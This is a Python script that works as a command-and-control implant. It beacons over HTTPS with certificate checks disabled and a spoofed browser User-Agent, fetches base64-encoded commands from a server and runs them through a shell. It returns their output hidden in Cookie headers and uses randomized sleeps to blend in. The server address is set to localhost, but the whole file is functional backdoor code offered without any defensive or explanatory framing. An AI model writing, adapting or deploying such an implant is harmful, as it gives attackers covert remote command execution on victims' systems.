import base64
import os
import sys
import uuid
import time
import subprocess
import random

version = sys.version_info
ul = __import__ ({2:'urllib2',3:'urllib.request'}[version[0]],fromlist=['build_opener'])
hs = []
if (version[0]==2 and version>=(2,7,9)) or version>=(3,4,3):
	import ssl
	sc = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
	sc.check_hostname = False
	sc.verify_mode = ssl.CERT_NONE
	hs.append(ul.HTTPSHandler(0, sc))


global url
url = "https://127.0.0.1:44443"
url += "/search/"

def say_hello():
  opener = ul.build_opener(*hs)
  opener.addheaders = [('User-Agent','Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko')]
  opener.addheaders = [('Accept-Encoding', 'gzip, deflate, br')]
  opener.addheaders = [('Cookie', 'SEVMTE8=')] # base64 "HELLO"
  random_url = uuid.uuid4().hex
  response = opener.open(url + random_url).read()
  opener.close()
  
  if "SEVMTE8=" in response:
    return True
  else:
    return False

def fetch_cmd():
  opener = ul.build_opener(*hs)
  opener.addheaders = [('User-Agent','Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko')]
  opener.addheaders = [('Accept-Encoding', 'gzip, deflate, br')]
  opener.addheaders = [('Cookie', 'QVNL')] # base64 "ASK"
  random_url = uuid.uuid4().hex
  response = opener.open(url + random_url).read()
  opener.close()
  index = response.rfind('>') + 1
  return base64.b64decode(response[index:])

def run_cmd(cmd):
  p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
  stdout,stderr = p.communicate()
  if len(stderr) > 0:
    return stderr.decode("utf-8")
  return stdout.decode("utf-8")

def reply_server(output):
  reply_str = str(base64.b64encode(output.encode("utf-8")))
  opener = ul.build_opener(*hs)
  opener.addheaders = [('User-Agent','Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko')]
  opener.addheaders = [('Accept-Encoding', 'gzip, deflate, br')]
  opener.addheaders = [('Cookie', reply_str)] # base64 output
  random_url = uuid.uuid4().hex
  opener.open(url + random_url).read()
  opener.close()

success = False
for i in range(3):
  success = say_hello()
  if success == True:
    break
  time.sleep(random.randint(1,5))

if success != True:
  exit()

while True:
  time.sleep(random.randint(1,3))
  cmd = fetch_cmd()
  if cmd == '':
    time.sleep(random.randint(1,3))
    continue
  if cmd == 'exit':
    reply_server('EXIT OK')
    exit()
  
  output = run_cmd(cmd)
  reply_server(output)
  cmd = ''
  

 

  



